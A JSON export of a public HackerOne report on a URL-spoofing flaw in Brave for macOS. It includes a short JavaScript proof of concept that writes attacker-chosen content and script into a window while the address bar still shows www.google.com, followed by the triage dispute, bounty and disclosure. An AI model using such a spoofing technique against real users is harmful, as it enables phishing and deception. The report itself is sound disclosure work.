{"id":369086,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjkwODY=","url":"https://hackerone.com/reports/369086","title":"URL spoofing in Brave for macOS","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-06-20T04:53:57.770Z","submitted_at":"2018-06-20T04:53:57.770Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"metnew","url":"/metnew","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15688,"url":"https://hackerone.com/brave","handle":"brave","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Brave Software","twitter_handle":"brave","website":"https://brave.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-10-04T00:50:38.097Z","bug_reporter_agreed_on_going_public_at":"2018-09-24T23:38:19.918Z","team_member_agreed_on_going_public_at":"2018-10-04T00:50:37.984Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nURL spoofing vulnerability.\n\n## Repro\n\n```\n\u003cscript\u003e\n    window.onclick = function () {\n        x = window.open('https://www.google.com/csi');\n        setTimeout(function () {\n            x.document.write(`I am not a www.google.com;\u003cbutton onclick=\"alert('I can run JS on this page!')\"\u003eclick me\u003c/button\u003e`)\n        }, 100);\n    }\n\u003c/script\u003e\n```\n\nURL in address bar is `https://www.google.com/csi`, but actually that's about:blank page.\nAttacker could inject arbitrary content and execute javascript on this page.\nAdditionally, during alert(), address bar continue displaying `www.google.com`\n\n\n## Products affected: \n\nBrave\t0.22.810\nV8\t6.7.288.43\nrev\t8f30eeb\nMuon\t7.0.6\nOS Release\t17.6.0\nUpdate Channel\tRelease\nOS Architecture\tx64\nOS Platform\tmacOS\nNode.js\t7.9.0\nBrave Sync\tv1.4.2\nlibchromiumcontent\t67.0.3396.71\nOS: macOS 10.13.5 17F77 x86_64\n\n## Impact\n\nTypical URL spoofing vulnerability impact. Could be explained, if required.","bounty_amount":"50.0","formatted_bounty":"$50","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":14,"voters":["foobar7","sameerphad72","ali","tungpun","eveeez","an0nym0us","agametov","khizer47","mefkan","japz","and 4 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":7933,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/brave/browser-laptop","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2910151,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e increase timeout if address bar is empty","automated_response":false,"created_at":"2018-06-20T07:21:02.736Z","updated_at":"2018-06-20T07:21:02.736Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2914456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @metnew,\n\nThanks for your submission. We are currently reviewing your report and will get back to you once we have additional information to share.\n\nKind regards,\n\n@fidgetspinner","automated_response":false,"created_at":"2018-06-21T06:37:57.651Z","updated_at":"2018-06-21T06:37:57.651Z","actor":{"username":"fidgetspinner","cleared":false,"url":"/fidgetspinner","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/239/770/3f9a1c9fcbb39dc86cab06aed16dda92753a5eee_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2914501,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @metnew,\n\nThank you for your submission! Your report has been validated, and it has been submitted to the appropriate remediation team for review. They will let the HackerOne triage team know the final ruling on this report, and if/when a fix will be implemented. The HackerOne triage team will follow-up after the remediation team has assessed the impact of this report. Please note that the status and severity are subject to change.\n\nKind regards,\n\n@fidgetspinner","automated_response":false,"created_at":"2018-06-21T06:55:15.516Z","updated_at":"2018-06-21T06:55:15.516Z","actor":{"username":"fidgetspinner","cleared":false,"url":"/fidgetspinner","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/239/770/3f9a1c9fcbb39dc86cab06aed16dda92753a5eee_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2922984,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Tracked here: https://github.com/brave/browser-laptop/issues/14520","automated_response":false,"created_at":"2018-06-22T16:44:03.855Z","updated_at":"2018-06-22T16:44:13.940Z","actor":{"username":"pranjal_jumde","cleared":false,"url":"/pranjal_jumde","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3003657,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"This appears to be another approach for taking advantage of the vulnerability identified in #374969. The underlying problem is the same.","automated_response":false,"created_at":"2018-07-06T22:58:31.885Z","updated_at":"2018-07-06T22:58:31.885Z","original_report_id":374969,"actor":{"username":"toml","cleared":false,"url":"/toml","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/229/717/56ea9edd04176aa3f29b215291bbc0b656699f67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3011080,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@toml Even if the underlying problem is the same, the impact of this vulnerability and the way of exploitation are completely different from #374969. I disagree with the resolution of this report.","automated_response":false,"created_at":"2018-07-07T15:11:41.736Z","updated_at":"2018-07-07T15:11:41.736Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3027273,"is_internal":false,"editable":false,"type":"Activities::HackerRequestedMediation","message":"This vulnerability relies on `about:blank` page that is generated when a server sends an empty response. As I think, an improper check between `\u003cwebview\u003e`'s URL and frame's real location probably leads to the vulnerability described in this report.\nI don't see any connection with #374969, which is actually a logic bug with protocol handlers.","automated_response":false,"created_at":"2018-07-10T23:57:57.116Z","updated_at":"2018-07-10T23:57:57.116Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3235485,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So finally, after releasing the patch for #374969 (https://github.com/brave/browser-laptop/issues/14681) it's clear that this vulnerability still reproducible in the latest release 0.23.103.\nBrave was completely ignoring me for 1.5 month and closed this report as duplicate.\n\n\u003e I don't think that's ok to communicate with researchers this way.\n\n #373721 is still available too.\n@toml @brave @diracdeltas","automated_response":false,"created_at":"2018-08-23T10:46:03.674Z","updated_at":"2018-08-23T10:46:03.674Z","actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":336877,"filename":"brave-marked-as-duplicate-but-actually-not.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/336/877/f67c2ff7c3af73c731663242197c2710f0838461/brave-marked-as-duplicate-but-actually-not.mp4?response-content-disposition=attachment%3B%20filename%3D%22brave-marked-as-duplicate-but-actually-not.mp4%22%3B%20filename%2A%3DUTF-8%27%27brave-marked-as-duplicate-but-actually-not.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145155Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=93eac8c9507059aec949039c57f4662ed997f269ad2279e6b5dcd78746dfcc38"}],"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3238026,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"agree this is not the same as the protocol handler issue","automated_response":false,"created_at":"2018-08-23T22:35:29.987Z","updated_at":"2018-08-23T22:35:29.987Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3238204,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-08-24T00:07:12.647Z","updated_at":"2018-08-24T00:07:12.647Z","actor":{"url":"/brave","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Brave Software"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"brave","collaborator":{"username":"metnew","url":"/metnew"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3238207,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-08-24T00:07:32.240Z","updated_at":"2018-08-24T00:07:32.240Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":170897,"new_severity_id":200299},"actor":{"username":"toml","cleared":false,"url":"/toml","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/229/717/56ea9edd04176aa3f29b215291bbc0b656699f67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3238212,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We don't anticipate fixing this one before Brave v1. 😥","automated_response":false,"created_at":"2018-08-24T00:08:05.189Z","updated_at":"2018-08-24T00:08:05.189Z","actor":{"username":"toml","cleared":false,"url":"/toml","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/229/717/56ea9edd04176aa3f29b215291bbc0b656699f67_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"metnew","url":"/metnew"},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3382938,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-09-24T23:38:19.949Z","updated_at":"2018-09-24T23:38:19.949Z","first_to_agree":true,"actor":{"username":"metnew","cleared":true,"url":"/metnew","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/544/baa5f77ccb2413a76bf96b3253ba88024ab50a33_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3431817,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-10-04T00:50:38.012Z","updated_at":"2018-10-04T00:50:38.012Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3431818,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-10-04T00:50:38.114Z","updated_at":"2018-10-04T00:50:38.114Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}